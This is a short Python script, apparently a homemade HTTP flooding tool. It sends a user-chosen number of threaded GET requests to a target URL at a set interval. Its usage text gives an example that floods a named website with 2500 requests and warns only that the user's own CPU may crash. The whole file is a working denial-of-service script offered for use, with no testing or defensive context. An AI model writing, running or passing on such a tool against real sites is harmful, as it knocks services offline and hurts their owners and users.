#!/usr/bin/python3
import requests, sys, threading,time 
def sendpackets():
	try:
		go = requests.get(sys.argv[2])
		print('[+] - Target:', sys.argv[2]+' StatusCode: '+str(go.status_code))
	except Exception as error:
		print('Error: ', error)

if len(sys.argv) <2:
	print("Usage: ", sys.argv[0],' <number of requests> <url> <interval>') 
	print("Example: ", sys.argv[0],' 2500 www.corujadeti.com 0.3')
	print("Maybe your cpu crash, but just warning.")
elif sys.argv[2].startswith('http://'):
	for i in range(int(sys.argv[1])):
		threading.Thread(target=sendpackets).start()
		time.sleep(float(sys.argv[3]))
else:
	sys.argv[2]='http://'+sys.argv[2]
	for i in range(int(sys.argv[1])):
		threading.Thread(target=sendpackets).start()
		time.sleep(float(sys.argv[3]))
